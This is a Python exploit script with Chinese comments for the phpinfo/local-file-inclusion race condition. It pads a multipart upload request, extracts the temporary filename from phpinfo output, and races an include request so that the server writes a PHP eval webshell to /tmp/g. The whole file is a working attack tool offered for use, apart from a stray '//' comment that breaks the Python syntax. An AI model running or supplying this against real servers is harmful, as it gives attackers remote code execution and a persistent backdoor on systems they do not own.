#!/usr/bin/python3
import sys
import threading
import socket
import time

# 配置常量
MAX_ATTEMPTS = 1000
DEFAULT_POOL_SIZE = 10
TAG = "SecurityTest"

def setup_payloads(host, port):
    """
    构造用于攻击的请求包。
    包含：1. 触发 PHP 生成临时文件的 POST 请求；2. 执行包含的 GET 请求。
    """
    # PHP 恶意负载：在目标机 /tmp/g 生成一个一句话木马
    php_payload = f"<?php file_put_contents('/tmp/g','<?=eval($_REQUEST[1])?>')?>\r\n"
    
    # 构建 POST 数据包内容
    req_data = (
        "-----------------------------7dbff1ded0714\r\n"
        'Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r\n'
        "Content-Type: text/plain\r\n\r\n"
        f"{TAG}\r\n{php_payload}"
        "-----------------------------7dbff1ded0714--\r\n"
    )

    # 构造超长 Header 用于撑大 PHP 缓冲区，延长临时文件存在时间
    padding = "A" * 5000
    req_header = (
        f"POST /phpinfo.php?a={padding} HTTP/1.1\r\n"//这里的phpinfo.php替换成自己找到的含有phpinfo()函数文件的位置
        f"Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; other={padding}\r\n"
        f"HTTP_ACCEPT: {padding}\r\n"
        f"HTTP_USER_AGENT: {padding}\r\n"
        f"Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r\n"
        f"Content-Length: {len(req_data)}\r\n"
        f"Host: {host}\r\n"
        "\r\n"
    )
    
    full_phpinfo_req = (req_header + req_data).encode('utf-8')
    
    # LFI 包含请求模板
    lfi_req_template = (
        "GET /lfi.php?file=%s HTTP/1.1\r\n"
        "User-Agent: Mozilla/4.0\r\n"
        "Proxy-Connection: Keep-Alive\r\n"
        f"Host: {host}\r\n"
        "\r\n\r\n"
    )
    
    return full_phpinfo_req, lfi_req_template

def php_info_lfi(host, port, php_info_req, offset, lfi_req_template):
    """
    核心竞争逻辑：发送上传请求 -> 从返回中提取临时文件名 -> 立即发送包含请求
    """
    try:
        # 创建两个连接：一个发 POST (phpinfo)，一个发 GET (LFI)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s1, \
             socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s2:
            
            s1.settimeout(3)
            s2.settimeout(3)
            s1.connect((host, port))
            s2.connect((host, port))

            # 发送触发上传的请求
            s1.send(php_info_req)
            
            # 读取响应并定位 tmp_name
            response = b""
            while len(response) < offset:
                chunk = s1.recv(offset)
                if not chunk: break
                response += chunk
            
            # 提取临时文件名 (例如 phpXXXXXX)
            try:
                content = response.decode('utf-8', errors='ignore')
                start = content.index("[tmp_name] =&gt; ") + 17
                tmp_file_name = content[start : start + 14].strip()
            except ValueError:
                return None

            # 立即竞争：发送 LFI 请求包含该临时文件
            s2.send((lfi_req_template % tmp_file_name).encode('utf-8'))
            lfi_response = s2.recv(4096).decode('utf-8', errors='ignore')

            if TAG in lfi_response:
                return tmp_file_name
    except Exception:
        pass
    return None

class Worker(threading.Thread):
    def __init__(self, event, lock, host, port, req, offset, lfi_tpl):
        super().__init__()
        self.event = event
        self.lock = lock
        self.host = host
        self.port = port
        self.req = req
        self.offset = offset
        self.lfi_tpl = lfi_tpl

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= MAX_ATTEMPTS:
                    return
                counter += 1
            
            res = php_info_lfi(self.host, self.port, self.req, self.offset, self.lfi_tpl)
            if res:
                print(f"\n[+] 成功! Shell 已创建: /tmp/g (临时文件: {res})")
                self.event.set()

def get_offset(host, port, php_info_req):
    """
    预检请求：确定 [tmp_name] 在 phpinfo 输出中的字节偏移位置
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.send(php_info_req)
        output = b""
        while True:
            chunk = s.recv(4096)
            output += chunk
            if not chunk or b"0\r\n\r\n" in chunk: break
        
        idx = output.find(b"[tmp_name] =&gt;")
        if idx == -1:
            raise ValueError("无法在 phpinfo 输出中找到 tmp_name，请检查路径是否正确。")
        
        print(f"[*] 找到 tmp_name 偏移位: {idx}")
        return idx + 256  # 稍微增加冗余

counter = 0

def main():
    global counter
    print("PHPInfo LFI 复现脚本 (Python 3 规范版)")
    print("-" * 40)

    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <host> [port] [threads]")
        return

    target_host = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    threads_count = int(sys.argv[3]) if len(sys.argv) > 3 else DEFAULT_POOL_SIZE

    try:
        req_php, lfi_tpl = setup_payloads(target_host, target_port)
        print("[*] 正在获取初始偏移量...")
        offset = get_offset(target_host, target_port, req_php)
        
        exit_event = threading.Event()
        thread_lock = threading.Lock()
        
        print(f"[*] 启动线程池 (数量: {threads_count})...")
        threads = []
        for _ in range(threads_count):
            t = Worker(exit_event, thread_lock, target_host, target_port, req_php, offset, lfi_tpl)
            t.start()
            threads.append(t)

        try:
            while not exit_event.wait(0.5):
                sys.stdout.write(f"\r进度: {counter}/{MAX_ATTEMPTS}")
                sys.stdout.flush()
                if counter >= MAX_ATTEMPTS: break
        except KeyboardInterrupt:
            print("\n[!] 用户中断，正在停止线程...")
            exit_event.set()

        for t in threads:
            t.join()
        
        print("\n[*] 任务结束。" if exit_event.is_set() else "\n[-] 未能在尝试次数内成功。")
        
    except Exception as e:
        print(f"\n[!] 错误: {e}")

if __name__ == "__main__":
    main()